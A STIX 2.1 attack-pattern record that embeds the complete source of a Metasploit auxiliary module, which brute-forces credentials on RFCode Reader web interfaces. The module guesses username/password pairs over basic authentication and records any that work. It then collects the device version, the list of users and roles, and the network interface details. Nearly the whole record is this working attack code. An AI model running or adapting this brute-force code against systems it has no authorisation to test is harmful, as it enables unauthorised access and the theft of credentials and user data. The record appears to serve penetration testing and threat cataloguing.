{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b25e5f41-9020-451e-ba0c-d8d4bdc33538",
    "created": "2024-08-14T16:28:42.094176Z",
    "modified": "2024-08-14T16:28:42.09418Z",
    "name": "RFCode Reader Web Interface Login / Bruteforce Utility",
    "description": " This module simply attempts to login to a RFCode Reader web interface. Please note that by default there is no authentication. In such a case, password brute force will not be performed. If there is authentication configured, the module will attempt to find valid login credentials and capture device information. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/rfcode_reader_enum.rb",
            "external_id": "rfcode_reader_enum.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'RFCode Reader Web Interface Login / Bruteforce Utility',\n      'Description'    => %{\n        This module simply attempts to login to a RFCode Reader web interface.\n        Please note that by default there is no authentication. In such a case, password brute force will not be performed.\n        If there is authentication configured, the module will attempt to find valid login credentials and capture device information.\n      },\n      'Author'         =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n      'License'\t => MSF_LICENSE\n\n    ))\n\n    register_options(\n      [\n        OptBool.new('STOP_ON_SUCCESS', [ true, \"Stop guessing when a credential works for a host\", true])\n      ])\n\n  end\n\n  #\n  # Info-Only\n  # Identify logged in user: /rfcode_reader/api/whoami.json\n  # Capture list of users: /rfcode_reader/api/userlist.json\n  # Interface configuration: /rfcode_reader/api/interfacestatus.json\n  # Device platform details: /rfcode_reader/api/version.json\n  #\n\n  def run_host(ip)\n    unless is_app_rfreader?\n      print_error(\"#{rhost}:#{rport} - Application does not appear to be RFCode Reader. Module will not continue.\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Checking if authentication is required...\")\n    unless is_auth_required?\n      print_warning(\"#{rhost}:#{rport} - Application does not require authentication.\")\n      user = ''\n      pass = ''\n\n      # Collect device platform & configuration info\n      collect_info(user, pass)\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Brute-forcing...\")\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  #\n  # What's the point of running this module if the app actually isn't RFCode Reader?\n  #\n  def is_app_rfreader?\n    res = send_request_cgi(\n      {\n        'uri' => '/rfcode_reader/api/whoami.json',\n        'vars_get' =>\n          {\n            '_dc' => '1369680704481'\n          }\n      })\n    return (res and res.code != 404)\n  end\n\n  #\n  # The default install of RFCode Reader app does not require authentication. Instead, it'll log the\n  # user right in. If that's the case, no point to brute-force, either.\n  #\n  def is_auth_required?\n    user = ''\n    pass = ''\n\n    res = send_request_cgi(\n      {\n        'uri'       => '/rfcode_reader/api/whoami.json',\n        'method'    => 'GET',\n        'authorization' => basic_auth(user,pass),\n        'vars_get'\t=>\n          {\n            '_dc' => '1369680704481'\n          }\n      })\n\n    return (res and res.body =~ /{  }/) ? false : true\n  end\n\n  #\n  # Brute-force the login page\n  #\n  def do_login(user, pass)\n\n    vprint_status(\"#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}\")\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => '/rfcode_reader/api/whoami.json',\n        'method'    => 'GET',\n        'authorization' => basic_auth(user,pass),\n        'vars_get'\t=>\n          {\n            '_dc' => '1369680704481'\n          }\n      })\n\n      if not res or res.code == 401\n        vprint_error(\"#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect} with code #{res.code}\")\n      else\n        print_good(\"#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}\")\n\n        collect_info(user, pass)\n\n        report_cred(\n          ip: rhost,\n          port: rport,\n          service_name: 'RFCode Reader',\n          user: user,\n          password: pass,\n          proof: res.code.to_s\n        )\n        return :next_user\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      print_error(\"#{rhost}:#{rport} - HTTP Connection Failed, Aborting\")\n      return :abort\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  #\n  # Collect target info\n  #\n  def collect_info(user, pass)\n\n    vprint_status(\"#{rhost}:#{rport} - Collecting information from app as #{user.inspect}:#{pass.inspect}...\")\n    begin\n\n      res = send_request_cgi(\n      {\n        'uri'       => '/rfcode_reader/api/version.json',\n        'method'    => 'GET',\n        'authorization' => basic_auth(user,pass),\n        'vars_get'      =>\n          {\n            '_dc' => '1370460180056'\n          }\n      })\n\n      if res and res.body\n        release_ver = JSON.parse(res.body)[\"release\"]\n        product_name = JSON.parse(res.body)[\"product\"]\n\n        vprint_status(\"#{rhost}:#{rport} - Collecting device platform info...\")\n        vprint_good(\"#{rhost}:#{rport} - Release version: '#{release_ver}', Product Name: '#{product_name}'\")\n\n        report_note(\n          :host   => rhost,\n          :proto  => 'tcp',\n          :port   => rport,\n          :sname  => \"RFCode Reader\",\n          :data   => \"Release Version: #{release_ver}, Product: #{product_name}\",\n          :type\t=> 'Info'\n        )\n      end\n\n      res = send_request_cgi(\n      {\n        'uri'       => '/rfcode_reader/api/userlist.json',\n        'method'    => 'GET',\n        'authorization' => basic_auth(user,pass),\n        'vars_get'      =>\n          {\n            '_dc' => '1370353972710'\n          }\n      })\n\n      if res and res.body\n        userlist = JSON.parse(res.body)\n        vprint_status(\"#{rhost}:#{rport} - Collecting user list...\")\n        vprint_good(\"#{rhost}:#{rport} - User list & role: #{userlist}\")\n\n        report_note(\n          :host   => rhost,\n          :proto  => 'tcp',\n          :port   => rport,\n          :sname\t=> \"RFCode Reader\",\n          :data   => \"User List & Roles: #{userlist}\",\n          :type\t=> 'Info'\n        )\n      end\n\n      res = send_request_cgi(\n      {\n        'uri'       => '/rfcode_reader/api/interfacestatus.json',\n        'method'    => 'GET',\n        'authorization' => basic_auth(user,pass),\n        'vars_get'      =>\n          {\n            '_dc' => '1369678668067'\n          }\n      })\n\n      if res and res.body\n        eth0_info = JSON.parse(res.body)[\"eth0\"]\n        vprint_status(\"#{rhost}:#{rport} - Collecting interface info...\")\n        vprint_good(\"#{rhost}:#{rport} - Interface eth0 info: #{eth0_info}\")\n\n        report_note(\n          :host\t=> rhost,\n          :proto\t=> 'tcp',\n          :port\t=> rport,\n          :sname\t=> \"RFCode Reader\",\n          :data\t=> \"Interface eth0: #{eth0_info}\",\n          :type\t=> 'Info'\n        )\n      end\n\n      return\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      vprint_error(\"#{rhost}:#{rport} - HTTP Connection Failed while collecting info\")\n      return\n    rescue JSON::ParserError\n      vprint_error(\"#{rhost}:#{rport} - Unable to parse JSON response while collecting info\")\n      return\n    end\n  end\nend\n"
}